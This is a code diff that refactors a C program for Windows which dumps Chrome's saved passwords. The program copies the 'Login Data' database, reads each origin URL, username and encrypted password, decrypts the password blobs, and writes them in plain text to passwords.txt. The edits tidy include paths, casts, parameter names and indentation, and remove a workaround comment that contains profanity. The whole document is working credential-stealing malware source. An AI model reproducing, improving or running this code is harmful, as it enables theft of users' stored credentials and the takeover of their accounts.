@@ -3,27 +3,26 @@
 
 #include <windows.h>
 #include <stdio.h>
-#include "sqlite3.h"
-#include <Lmcons.h>
-#include <Shlobj.h>
+#include "sqlite/sqlite3.h"
+#include <Shlobj.h> /* CSIDL_LOCAL_APPDATA */
 
-#define CHROME_APP_DATA_PATH     "\\Google\\Chrome\\User Data\\Default\\Login Data"
-#define TEMP_DB_PATH             ".\\chromedb"
-#define USER_DATA_QUERY          "SELECT ORIGIN_URL,USERNAME_VALUE,PASSWORD_VALUE FROM LOGINS"
-#define SECRET_FILE              ".\\passwords.txt"
+#define CHROME_APP_DATA_PATH  "\\Google\\Chrome\\User Data\\Default\\Login Data"
+#define TEMP_DB_PATH          ".\\chromedb_tmp"
+#define USER_DATA_QUERY       "SELECT ORIGIN_URL,USERNAME_VALUE,PASSWORD_VALUE FROM LOGINS"
+#define SECRET_FILE           ".\\passwords.txt"
 
 FILE *file_with_secrets;
 int row_id = 1;
 
-static int process_row(void *NotUsed, int argc, char **argv, char **azColName);
-static int fill_secret_file(char *url,char *username,char *password);
+static int process_row(void *passed_db, int argc, char **argv, char **col_name);
+static int fill_secret_file(char *url,char *username,unsigned char *password);
 
 int main(void)
 {
 		sqlite3 *logindata_database = NULL; /* represents database where Chrome holds passwords */
 		char *err_msg = NULL;
 		int result;
-		char original_db_location[_MAX_PATH]; /* original location of chrome database */
+		char original_db_location[_MAX_PATH]; /* original location of Login Data */
 
 		memset(original_db_location,0,_MAX_PATH);
 		
@@ -43,9 +42,9 @@ int main(void)
 		
 		result = sqlite3_open_v2(TEMP_DB_PATH, &logindata_database,SQLITE_OPEN_READONLY,NULL); 
 		if (result) {
-				fprintf(stderr, "sqlite3_open() -> Cannot open database: %s\n", sqlite3_errstr(result));
+				fprintf(stderr, "sqlite3_open_v2() -> Cannot open database: %s\n", sqlite3_errstr(result));
 				goto out;
-        }
+		}
 		
 		file_with_secrets = fopen(SECRET_FILE,"w+");
 		if (!file_with_secrets) {
@@ -54,7 +53,7 @@ int main(void)
 		}
 
 		result = sqlite3_exec(logindata_database,USER_DATA_QUERY,process_row, logindata_database, &err_msg);
-        if (result!=SQLITE_OK) 
+		if (result!=SQLITE_OK) 
 				fprintf(stderr, "sqlite3_exec() -> %s (%s)\n", err_msg, sqlite3_errstr(result));
 
 		sqlite3_free(err_msg);
@@ -83,9 +82,6 @@ static int process_row(void *passed_db, int argc, char **argv, char **col_name)
 		int blob_size;
 		int i;
 
-		if (row_id==3)
-				row_id++;/* TODO reinstall chrome | какая-то хуйня с row id случилась, потому и костыль*/
-
 		result = sqlite3_blob_open(db,"main","logins","password_value",row_id,0,&blob);
 		if (result!=SQLITE_OK) {
 				fprintf(stderr,"sqlite3_blob_open() -> %s\n",sqlite3_errstr(result));
@@ -96,7 +92,7 @@ static int process_row(void *passed_db, int argc, char **argv, char **col_name)
 		
 		blob_size = sqlite3_blob_bytes(blob);
 
-		blob_data = (BYTE*)malloc(blob_size);
+		blob_data = malloc(blob_size);
 		if (!blob_data) {
 				fprintf(stderr,"malloc() -> Failed to allocate memory for blob_data\n");
 				goto out_blob;
@@ -116,7 +112,7 @@ static int process_row(void *passed_db, int argc, char **argv, char **col_name)
 				goto out_blob_data;
 		}
 		
-		password_array = (unsigned char*)malloc(decrypted_password.cbData+1);
+		password_array = malloc(decrypted_password.cbData+1);
 		if (!password_array) {
 				fprintf(stderr,"malloc() -> Failed to allocate memory for password array\n");
 				goto out_crypt;
